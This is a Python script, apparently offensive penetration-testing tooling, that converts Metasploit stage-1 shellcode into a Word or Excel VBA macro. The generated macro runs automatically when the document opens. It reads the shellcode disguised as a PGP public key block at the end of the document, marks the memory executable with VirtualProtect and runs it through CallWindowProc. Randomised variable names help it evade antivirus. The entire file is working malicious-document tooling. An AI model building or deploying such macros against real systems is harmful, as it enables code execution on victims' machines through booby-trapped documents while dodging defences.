# coding: latin1
#! /usr/bin/env python

"""
Generate VBA macros from Metasploit stage-1 payload in C format.
The payload is injected in memory avoiding Antivirus detection.

Usage: genvba.py <payload_file.c>

The MIT License

Copyright (c) Include Security <www.includesecurity.com>
Copyright (c) Nico <nico@slayer.is>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""

import sys
import os.path
import argparse

from uuid import uuid4

parser = argparse.ArgumentParser(description="Generate VBA macros from Metasploit stage-1 payload in C format")
parser.add_argument("payload", help="Metasploit stage-1 payload file in C")
parser.add_argument("--x64", help="64 bits payload?", action="store_true")
parser.add_argument("--output", help="Output file", default="macro.vba")
args = parser.parse_args()

class Vars(object):
    def __init__(self, *args):
        for item in args:
            setattr(self, item, "v%s" % str(uuid4()).replace("-", ""))

if not os.path.exists(args.payload):
  print("[-] %s does not exists!" % args.payload)
  sys.exit(2)

# Quick and dirty shellcode extraction
with open(args.payload, "r") as f:
    payload = f.read().replace("\"", "").replace("\\x", "").replace("\n","").replace("\r", "")

begin = payload.find("buf[] =")
end = payload.find(";", begin)

data = Vars("procname", "paragraph", "hexpos", "found", "payload", "memory", "retval", "memoryidx", "oldprotect")
data.stage1 = payload[begin + 7:end].strip()

if args.x64:
    data.decls = """
Private Declare PtrSafe Function CallWindowProc Lib "user32" Alias "CallWindowProcA" _
    (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As Long, ByVal Msg As LongPtr, _
    ByVal wParam As LongPtr, ByVal lParam As LongPtr) As Long

Private Declare PtrSafe Function VirtualProtect Lib "kernel32.dll" (ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, ByVal newProtect As Long, ByRef oldProtect As Long) As Boolean
"""
else:
    data.decls = """
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" _
    (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, _
    ByVal wParam As Long, ByVal lParam As Long) As Long

Private Declare Function VirtualProtect Lib "kernel32.dll" (ByVal lpAddress As Long, _
    ByVal dwSize As Long, ByVal newProtect As Long, ByRef oldProtect As Long) As Boolean
"""

vbamacro = """
'************************************************
'* Create a word document with this macro
'************************************************

%(decls)s

Sub Auto_Open()
    %(procname)s
End Sub

Sub %(procname)s()
    Dim %(paragraph)s As Paragraph, %(hexpos)s As Long, %(found)s As Boolean, %(payload)s As String, %(retval)s(11) As Byte, %(memoryidx)s As Long, %(oldprotect)s As Long
    Static %(memory)s(4000) As Byte
    On Error Resume Next
    For Each %(paragraph)s In ActiveDocument.Paragraphs
        DoEvents: %(payload)s = %(paragraph)s.Range.Text
        If (%(found)s = True) Then
            %(hexpos)s = 1
            %(memoryidx)s = 0
            While (%(hexpos)s < Len(%(payload)s))
                %(memory)s(%(memoryidx)s) = "&H" + Mid(%(payload)s, %(hexpos)s, 2)
                %(hexpos)s = %(hexpos)s + 2
                %(memoryidx)s = %(memoryidx)s + 1
            Wend
        ElseIf (InStr(1, %(payload)s,  "-----BEGIN PGP PUBLIC KEY BLOCK-----") > 0 And Len(%(payload)s) > 0) Then
            %(found)s = True
        End If
    Next
    VirtualProtect VarPtr(%(memory)s(0)), 4000, &H40, %(oldprotect)s
    CallWindowProc VarPtr(%(memory)s(0)), 0, VarPtr(%(retval)s(0)), VarPtr(%(retval)s(8)), VarPtr(%(retval)s(4))
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub

'***********************************************************************************************************************
'* Copy this at the end of the document as one paragraph. This is the Metasploit stage-1 payload disguised as a PGP key
'***********************************************************************************************************************

-----BEGIN PGP PUBLIC KEY BLOCK-----
%(stage1)s
"""

with open(args.output, "w") as f:
    f.write(vbamacro % data.__dict__)

print("%s file created!" % args.output)
